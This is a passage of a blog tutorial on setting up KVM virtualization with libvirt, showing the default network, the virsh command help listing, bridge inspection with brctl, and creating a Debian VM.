</span><span class='line'>  &lt;ip address='192.168.122.1' netmask='255.255.255.0'&gt;
</span><span class='line'>    &lt;dhcp&gt;
</span><span class='line'>      &lt;range start='192.168.122.2' end='192.168.122.254'/&gt;
</span><span class='line'>    &lt;/dhcp&gt;
</span><span class='line'>  &lt;/ip&gt;
</span><span class='line'>&lt;/network&gt;</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see if the default network has been created. Don&rsquo;t forget to start the <strong>libvirtd</strong> daemon first, with <code>systemctl start libvirtd</code> and then use virsh to list the defined networks. <strong>virsh</strong> is a powerful command line interface tool for managing guests and the hypervisor. It can also be used as an interactive prompt.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh
</span><span class='line'>Welcome to virsh, the virtualization interactive terminal.
</span><span class='line'>
</span><span class='line'>Type:  'help' for help with commands
</span><span class='line'>       'quit' to quit
</span><span class='line'>
</span><span class='line'>virsh # help
</span><span class='line'>Grouped commands:
</span><span class='line'>
</span><span class='line'> Domain Management (help keyword 'domain'):
</span><span class='line'>    attach-device                  attach device from an XML file
</span><span class='line'>    attach-disk                    attach disk device
</span><span class='line'>    attach-interface               attach network interface
</span><span class='line'>    autostart                      autostart a domain
</span><span class='line'>    blkdeviotune                   Set or query a block device I/O tuning parameters.
</span><span class='line'>    blkiotune                      Get or set blkio parameters
</span><span class='line'>    blockcommit                    Start a block commit operation.
</span><span class='line'>    blockcopy                      Start a block copy operation.
</span><span class='line'>    blockjob                       Manage active block operations
</span><span class='line'>    blockpull                      Populate a disk from its backing image.
</span><span class='line'>    blockresize                    Resize block device of domain.
</span><span class='line'>    change-media                   Change media of CD or floppy drive
</span><span class='line'>    console                        connect to the guest console
</span><span class='line'>    cpu-baseline                   compute baseline CPU
</span><span class='line'>    cpu-compare                    compare host CPU with a CPU described by an XML file
</span><span class='line'>    cpu-stats                      show domain cpu statistics
</span><span class='line'>    create                         create a domain from an XML file
</span><span class='line'>    define                         define (but don't start) a domain from an XML file
</span><span class='line'>    desc                           show or set domain's description or title
</span><span class='line'>    destroy                        destroy (stop) a domain
</span><span class='line'>    detach-device                  detach device from an XML file
</span><span class='line'>    detach-disk                    detach disk device
</span><span class='line'>    detach-interface               detach network interface
</span><span class='line'>    domdisplay                     domain display connection URI
</span><span class='line'>    domfsfreeze                    Freeze domain's mounted filesystems.
</span><span class='line'>    domfsthaw                      Thaw domain's mounted filesystems.
</span><span class='line'>    domfsinfo                      Get information of domain's mounted filesystems.
</span><span class='line'>    domfstrim                      Invoke fstrim on domain's mounted filesystems.
</span><span class='line'>    domhostname                    print the domain's hostname
</span><span class='line'>    domid                          convert a domain name or UUID to domain id
</span><span class='line'>    domif-setlink                  set link state of a virtual interface
</span><span class='line'>    domiftune                      get/set parameters of a virtual interface
</span><span class='line'>    domjobabort                    abort active domain job
</span><span class='line'>    domjobinfo                     domain job information
</span><span class='line'>    domname                        convert a domain id or UUID to domain name
</span><span class='line'>    domrename                      rename a domain
</span><span class='line'>    dompmsuspend                   suspend a domain gracefully using power management functions
</span><span class='line'>    dompmwakeup                    wakeup a domain from pmsuspended state
</span><span class='line'>    domuuid                        convert a domain name or id to domain UUID
</span><span class='line'>    domxml-from-native             Convert native config to domain XML
</span><span class='line'>    domxml-to-native               Convert domain XML to native config
</span><span class='line'>    dump                           dump the core of a domain to a file for analysis
</span><span class='line'>    dumpxml                        domain information in XML
</span><span class='line'>    edit                           edit XML configuration for a domain
</span><span class='line'>    event                          Domain Events
</span><span class='line'>    inject-nmi                     Inject NMI to the guest
</span><span class='line'>    iothreadinfo                   view domain IOThreads
</span><span class='line'>    iothreadpin                    control domain IOThread affinity
</span><span class='line'>    iothreadadd                    add an IOThread to the guest domain
</span><span class='line'>    iothreaddel                    delete an IOThread from the guest domain
</span><span class='line'>    send-key                       Send keycodes to the guest
</span><span class='line'>    send-process-signal            Send signals to processes
</span><span class='line'>    lxc-enter-namespace            LXC Guest Enter Namespace
</span><span class='line'>    managedsave                    managed save of a domain state
</span><span class='line'>    managedsave-remove             Remove managed save of a domain
</span><span class='line'>    memtune                        Get or set memory parameters
</span><span class='line'>    perf                           Get or set perf event
</span><span class='line'>    metadata                       show or set domain's custom XML metadata
</span><span class='line'>    migrate                        migrate domain to another host
</span><span class='line'>    migrate-setmaxdowntime         set maximum tolerable downtime
</span><span class='line'>    migrate-compcache              get/set compression cache size
</span><span class='line'>    migrate-setspeed               Set the maximum migration bandwidth
</span><span class='line'>    migrate-getspeed               Get the maximum migration bandwidth
</span><span class='line'>    migrate-postcopy               Switch running migration from pre-copy to post-copy
</span><span class='line'>    numatune                       Get or set numa parameters
</span><span class='line'>    qemu-attach                    QEMU Attach
</span><span class='line'>    qemu-monitor-command           QEMU Monitor Command
</span><span class='line'>    qemu-monitor-event             QEMU Monitor Events
</span><span class='line'>    qemu-agent-command             QEMU Guest Agent Command
</span><span class='line'>    reboot                         reboot a domain
</span><span class='line'>    reset                          reset a domain
</span><span class='line'>    restore                        restore a domain from a saved state in a file
</span><span class='line'>    resume                         resume a domain
</span><span class='line'>    save                           save a domain state to a file
</span><span class='line'>    save-image-define              redefine the XML for a domain's saved state file
</span><span class='line'>    save-image-dumpxml             saved state domain information in XML
</span><span class='line'>    save-image-edit                edit XML for a domain's saved state file
</span><span class='line'>    schedinfo                      show/set scheduler parameters
</span><span class='line'>    screenshot                     take a screenshot of a current domain console and store it into a file
</span><span class='line'>    set-user-password              set the user password inside the domain
</span><span class='line'>    setmaxmem                      change maximum memory limit
</span><span class='line'>    setmem                         change memory allocation
</span><span class='line'>    setvcpus                       change number of virtual CPUs
</span><span class='line'>    shutdown                       gracefully shutdown a domain
</span><span class='line'>    start                          start a (previously defined) inactive domain
</span><span class='line'>    suspend                        suspend a domain
</span><span class='line'>    ttyconsole                     tty console
</span><span class='line'>    undefine                       undefine a domain
</span><span class='line'>    update-device                  update device from an XML file
</span><span class='line'>    vcpucount                      domain vcpu counts
</span><span class='line'>    vcpuinfo                       detailed domain vcpu information
</span><span class='line'>    vcpupin                        control or query domain vcpu affinity
</span><span class='line'>    emulatorpin                    control or query domain emulator affinity
</span><span class='line'>    vncdisplay                     vnc display
</span><span class='line'>    guestvcpus                     query or modify state of vcpu in the guest (via agent)
</span><span class='line'>    setvcpu                        attach/detach vcpu or groups of threads
</span><span class='line'>    domblkthreshold                set the threshold for block-threshold event for a given block device or it's backing chain element
</span><span class='line'>
</span><span class='line'> Domain Monitoring (help keyword 'monitor'):
</span><span class='line'>    domblkerror                    Show errors on block devices
</span><span class='line'>    domblkinfo                     domain block device size information
</span><span class='line'>    domblklist                     list all domain blocks
</span><span class='line'>    domblkstat                     get device block stats for a domain
</span><span class='line'>    domcontrol                     domain control interface state
</span><span class='line'>    domif-getlink                  get link state of a virtual interface
</span><span class='line'>    domifaddr                      Get network interfaces' addresses for a running domain
</span><span class='line'>    domiflist                      list all domain virtual interfaces
</span><span class='line'>    domifstat                      get network interface stats for a domain
</span><span class='line'>    dominfo                        domain information
</span><span class='line'>    dommemstat                     get memory statistics for a domain
</span><span class='line'>    domstate                       domain state
</span><span class='line'>    domstats                       get statistics about one or multiple domains
</span><span class='line'>    domtime                        domain time
</span><span class='line'>    list                           list domains
</span><span class='line'>
</span><span class='line'> Host and Hypervisor (help keyword 'host'):
</span><span class='line'>    allocpages                     Manipulate pages pool size
</span><span class='line'>    capabilities                   capabilities
</span><span class='line'>    cpu-models                     CPU models
</span><span class='line'>    domcapabilities                domain capabilities
</span><span class='line'>    freecell                       NUMA free memory
</span><span class='line'>    freepages                      NUMA free pages
</span><span class='line'>    hostname                       print the hypervisor hostname
</span><span class='line'>    maxvcpus                       connection vcpu maximum
</span><span class='line'>    node-memory-tune               Get or set node memory parameters
</span><span class='line'>    nodecpumap                     node cpu map
</span><span class='line'>    nodecpustats                   Prints cpu stats of the node.
</span><span class='line'>    nodeinfo                       node information
</span><span class='line'>    nodememstats                   Prints memory stats of the node.
</span><span class='line'>    nodesuspend                    suspend the host node for a given time duration
</span><span class='line'>    sysinfo                        print the hypervisor sysinfo
</span><span class='line'>    uri                            print the hypervisor canonical URI
</span><span class='line'>    version                        show version
</span><span class='line'>
</span><span class='line'> Interface (help keyword 'interface'):
</span><span class='line'>    iface-begin                    create a snapshot of current interfaces settings, which can be later committed (iface-commit) or restored (iface-rollback)
</span><span class='line'>    iface-bridge                   create a bridge device and attach an existing network device to it
</span><span class='line'>    iface-commit                   commit changes made since iface-begin and free restore point
</span><span class='line'>    iface-define                   define an inactive persistent physical host interface or modify an existing persistent one from an XML file
</span><span class='line'>    iface-destroy                  destroy a physical host interface (disable it / "if-down")
</span><span class='line'>    iface-dumpxml                  interface information in XML
</span><span class='line'>    iface-edit                     edit XML configuration for a physical host interface
</span><span class='line'>    iface-list                     list physical host interfaces
</span><span class='line'>    iface-mac                      convert an interface name to interface MAC address
</span><span class='line'>    iface-name                     convert an interface MAC address to interface name
</span><span class='line'>    iface-rollback                 rollback to previous saved configuration created via iface-begin
</span><span class='line'>    iface-start                    start a physical host interface (enable it / "if-up")
</span><span class='line'>    iface-unbridge                 undefine a bridge device after detaching its slave device
</span><span class='line'>    iface-undefine                 undefine a physical host interface (remove it from configuration)
</span><span class='line'>
</span><span class='line'> Network Filter (help keyword 'filter'):
</span><span class='line'>    nwfilter-define                define or update a network filter from an XML file
</span><span class='line'>    nwfilter-dumpxml               network filter information in XML
</span><span class='line'>    nwfilter-edit                  edit XML configuration for a network filter
</span><span class='line'>    nwfilter-list                  list network filters
</span><span class='line'>    nwfilter-undefine              undefine a network filter
</span><span class='line'>
</span><span class='line'> Networking (help keyword 'network'):
</span><span class='line'>    net-autostart                  autostart a network
</span><span class='line'>    net-create                     create a network from an XML file
</span><span class='line'>    net-define                     define an inactive persistent virtual network or modify an existing persistent one from an XML file
</span><span class='line'>    net-destroy                    destroy (stop) a network
</span><span class='line'>    net-dhcp-leases                print lease info for a given network
</span><span class='line'>    net-dumpxml                    network information in XML
</span><span class='line'>    net-edit                       edit XML configuration for a network
</span><span class='line'>    net-event                      Network Events
</span><span class='line'>    net-info                       network information
</span><span class='line'>    net-list                       list networks
</span><span class='line'>    net-name                       convert a network UUID to network name
</span><span class='line'>    net-start                      start a (previously defined) inactive network
</span><span class='line'>    net-undefine                   undefine a persistent network
</span><span class='line'>    net-update                     update parts of an existing network's configuration
</span><span class='line'>    net-uuid                       convert a network name to network UUID
</span><span class='line'>
</span><span class='line'> Node Device (help keyword 'nodedev'):
</span><span class='line'>    nodedev-create                 create a device defined by an XML file on the node
</span><span class='line'>    nodedev-destroy                destroy (stop) a device on the node
</span><span class='line'>    nodedev-detach                 detach node device from its device driver
</span><span class='line'>    nodedev-dumpxml                node device details in XML
</span><span class='line'>    nodedev-list                   enumerate devices on this host
</span><span class='line'>    nodedev-reattach               reattach node device to its device driver
</span><span class='line'>    nodedev-reset                  reset node device
</span><span class='line'>    nodedev-event                  Node Device Events
</span><span class='line'>
</span><span class='line'> Secret (help keyword 'secret'):
</span><span class='line'>    secret-define                  define or modify a secret from an XML file
</span><span class='line'>    secret-dumpxml                 secret attributes in XML
</span><span class='line'>    secret-event                   Secret Events
</span><span class='line'>    secret-get-value               Output a secret value
</span><span class='line'>    secret-list                    list secrets
</span><span class='line'>    secret-set-value               set a secret value
</span><span class='line'>    secret-undefine                undefine a secret
</span><span class='line'>
</span><span class='line'> Snapshot (help keyword 'snapshot'):
</span><span class='line'>    snapshot-create                Create a snapshot from XML
</span><span class='line'>    snapshot-create-as             Create a snapshot from a set of args
</span><span class='line'>    snapshot-current               Get or set the current snapshot
</span><span class='line'>    snapshot-delete                Delete a domain snapshot
</span><span class='line'>    snapshot-dumpxml               Dump XML for a domain snapshot
</span><span class='line'>    snapshot-edit                  edit XML for a snapshot
</span><span class='line'>    snapshot-info                  snapshot information
</span><span class='line'>    snapshot-list                  List snapshots for a domain
</span><span class='line'>    snapshot-parent                Get the name of the parent of a snapshot
</span><span class='line'>    snapshot-revert                Revert a domain to a snapshot
</span><span class='line'>
</span><span class='line'> Storage Pool (help keyword 'pool'):
</span><span class='line'>    find-storage-pool-sources-as   find potential storage pool sources
</span><span class='line'>    find-storage-pool-sources      discover potential storage pool sources
</span><span class='line'>    pool-autostart                 autostart a pool
</span><span class='line'>    pool-build                     build a pool
</span><span class='line'>    pool-create-as                 create a pool from a set of args
</span><span class='line'>    pool-create                    create a pool from an XML file
</span><span class='line'>    pool-define-as                 define a pool from a set of args
</span><span class='line'>    pool-define                    define an inactive persistent storage pool or modify an existing persistent one from an XML file
</span><span class='line'>    pool-delete                    delete a pool
</span><span class='line'>    pool-destroy                   destroy (stop) a pool
</span><span class='line'>    pool-dumpxml                   pool information in XML
</span><span class='line'>    pool-edit                      edit XML configuration for a storage pool
</span><span class='line'>    pool-info                      storage pool information
</span><span class='line'>    pool-list                      list pools
</span><span class='line'>    pool-name                      convert a pool UUID to pool name
</span><span class='line'>    pool-refresh                   refresh a pool
</span><span class='line'>    pool-start                     start a (previously defined) inactive pool
</span><span class='line'>    pool-undefine                  undefine an inactive pool
</span><span class='line'>    pool-uuid                      convert a pool name to pool UUID
</span><span class='line'>    pool-event                     Storage Pool Events
</span><span class='line'>
</span><span class='line'> Storage Volume (help keyword 'volume'):
</span><span class='line'>    vol-clone                      clone a volume.
</span><span class='line'>    vol-create-as                  create a volume from a set of args
</span><span class='line'>    vol-create                     create a vol from an XML file
</span><span class='line'>    vol-create-from                create a vol, using another volume as input
</span><span class='line'>    vol-delete                     delete a vol
</span><span class='line'>    vol-download                   download volume contents to a file
</span><span class='line'>    vol-dumpxml                    vol information in XML
</span><span class='line'>    vol-info                       storage vol information
</span><span class='line'>    vol-key                        returns the volume key for a given volume name or path
</span><span class='line'>    vol-list                       list vols
</span><span class='line'>    vol-name                       returns the volume name for a given volume key or path
</span><span class='line'>    vol-path                       returns the volume path for a given volume name or key
</span><span class='line'>    vol-pool                       returns the storage pool for a given volume key or path
</span><span class='line'>    vol-resize                     resize a vol
</span><span class='line'>    vol-upload                     upload file contents to a volume
</span><span class='line'>    vol-wipe                       wipe a vol
</span><span class='line'>
</span><span class='line'> Virsh itself (help keyword 'virsh'):
</span><span class='line'>    cd                             change the current directory
</span><span class='line'>    echo                           echo arguments
</span><span class='line'>    exit                           quit this interactive terminal
</span><span class='line'>    help                           print help
</span><span class='line'>    pwd                            print the current directory
</span><span class='line'>    quit                           quit this interactive terminal
</span><span class='line'>    connect                        (re)connect to hypervisor</span></code></pre></td></tr></table></div></figure>


<p>Ok, default network check now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh net-list --all
</span><span class='line'> Name                 State      Autostart     Persistent
</span><span class='line'>----------------------------------------------------------
</span><span class='line'> default              inactive   no            yes</span></code></pre></td></tr></table></div></figure>


<p>The default network is inactive, so we have to enable it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh net-start default
</span><span class='line'>Network default started</span></code></pre></td></tr></table></div></figure>


<p>Now, if you do an <em>ifconfig</em>, you should see the new bridge interface:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
</span><span class='line'>        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
</span><span class='line'>        ether 52:54:00:b2:a7:6e  txqueuelen 1000  (Ethernet)
</span><span class='line'>        RX packets 0  bytes 0 (0.0 B)
</span><span class='line'>        RX errors 0  dropped 0  overruns 0  frame 0
</span><span class='line'>        TX packets 0  bytes 0 (0.0 B)
</span><span class='line'>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span></code></pre></td></tr></table></div></figure>


<p>To get more info about your bridge, you can use the <strong>brctl</strong> command:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brctl
</span><span class='line'>Usage: brctl [commands]
</span><span class='line'>commands:
</span><span class='line'>  addbr       &lt;bridge&gt;      add bridge
</span><span class='line'>  delbr       &lt;bridge&gt;      delete bridge
</span><span class='line'>  addif       &lt;bridge&gt; &lt;device&gt;   add interface to bridge
</span><span class='line'>  delif       &lt;bridge&gt; &lt;device&gt;   delete interface from bridge
</span><span class='line'>  hairpin     &lt;bridge&gt; &lt;port&gt; {on|off}    turn hairpin on/off
</span><span class='line'>  setageing   &lt;bridge&gt; &lt;time&gt;     set ageing time
</span><span class='line'>  setbridgeprio   &lt;bridge&gt; &lt;prio&gt;     set bridge priority
</span><span class='line'>  setfd       &lt;bridge&gt; &lt;time&gt;     set bridge forward delay
</span><span class='line'>  sethello    &lt;bridge&gt; &lt;time&gt;     set hello time
</span><span class='line'>  setmaxage   &lt;bridge&gt; &lt;time&gt;     set max message age
</span><span class='line'>  setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt;    set path cost
</span><span class='line'>  setportprio &lt;bridge&gt; &lt;port&gt; &lt;prio&gt;    set port priority
</span><span class='line'>  show        [ &lt;bridge&gt; ]      show a list of bridges
</span><span class='line'>  showmacs    &lt;bridge&gt;      show a list of mac addrs
</span><span class='line'>  showstp     &lt;bridge&gt;      show bridge stp info
</span><span class='line'>  stp         &lt;bridge&gt; {on|off} turn stp on/off</span></code></pre></td></tr></table></div></figure>


<blockquote><p>brctl is used to set up, maintain, and inspect the ethernet bridge configuration in the linux kernel.</p>

<p>An ethernet bridge is a device commonly used to connect different  networks of ethernets together, so that these
ethernets will appear as one ethernet to the participants.</p>

<p>Each of the ethernets  being  connected  corresponds  to  one  physical interface  in  the  bridge. These individual
ethernets are bundled into one bigger (&lsquo;logical&rsquo;) ethernet, this bigger  ethernet  corresponds  to the bridge
network interface.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>brctl show
</span><span class='line'>bridge name   bridge id       STP enabled interfaces
</span><span class='line'>virbr0        8000.525400b2a76e   yes     virbr0-nic</span></code></pre></td></tr></table></div></figure>


<p>Ok, now we have the default network set. It&rsquo;s time to actually start some VMs. In KVM, VMs can be managed both from the command line with virsh, and from the GUI, with Virtual Network Manager, which you can find under System Tools.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/virtmanager.png" title="virtmanager" alt="virtmanager"></p>

<p><strong>Before starting to create VMs, please reboot your host to save you time and headaches</strong>.</p>

<p>I grabbed a Debian iso to showcase its live CD, and I created a VM from it:</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/1-new.png" title="new vm" alt="new vm"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/2-os.png" title="os" alt="os"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/3-hw.png" title="hardware" alt="hardware specs"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/4-space.png" title="disk" alt="disk"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/5-final.png" title="create vm" alt="create vm"></p>

<p>I had to do one more step before getting rid of errors every time I finished with the VM creation. libvirt was pointing to the qemu-kvm binary, but I had no such file, so I created a symlink as specified in this <a href="https://bbs.archlinux.org/viewtopic.php?pid=1240205#p1240205">Arch Linux forum</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ln -s /usr/bin/qemu-{system-x86_64,kvm}
</span><span class='line'>ls -la /usr/bin/qemu-kvm
</span><span class='line'>lrwxrwxrwx 1 root root 27 Sep 17 13:19 /usr/bin/qemu-kvm -&gt; /usr/bin/qemu-system-x86_64</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/vm.png" title="vm" alt="working vm"></p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/kvm/details.png" title="vm details" alt="vm details"></p>

<p>KVM graphical interface is nice, but we are not limited to a GUI. We can create and interact with VMs from the command line!</p>

<p>First, let&rsquo;s see if what VMs we&rsquo;ve got:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>virsh list --all
</span><span class='line'> Id    Name                           State
</span><span class='line'>----------------------------------------------------
</span><span class='line'> -     generic                        shut off</span></code></pre></td></tr></table></div></figure>


<p>If we only wanted to list the running VMs, we could do it with <code>virsh list</code></p>

<p>Now, I&rsquo;m going to start a VM, which in virsh talk is called a domain, and look at some info about it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
